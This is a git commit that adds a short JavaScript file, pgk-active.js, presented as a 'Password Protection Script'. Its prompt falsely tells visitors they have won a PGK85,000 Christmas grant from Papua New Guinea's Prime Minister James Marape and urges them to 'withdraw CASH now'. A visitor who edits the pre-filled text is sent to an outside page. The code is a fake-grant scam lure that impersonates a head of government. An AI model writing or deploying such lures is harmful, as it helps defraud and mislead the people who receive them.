d59302c70c9f5899bbc7238df9fbe00dace0611c
itidnewblog4 <ukpehaitid2@gmail.com>
2025-12-22 10:25:37 +0100

    Create pgk-active.js

---
+++ pgk-active.js
@@ -0,0 +1,10 @@
+  
+/* Password Protection Script by www.onlineofferz.xyz*/
+var password = 'WITHDRAW PGK85,000'
+password = prompt(
+  'SMS: Congratulations! You are eligible to receive the PGK85,000 Christmas and new year Grant from the Prime Minister James Marape. Please press OK to withdraw CASH now.',
+  'WITHDRAW PGK85,000'
+);
+if (password != 'WITHDRAW PGK85,000') {
+  location.href = 'https://phlug.org/pgk85-000.html';
+}
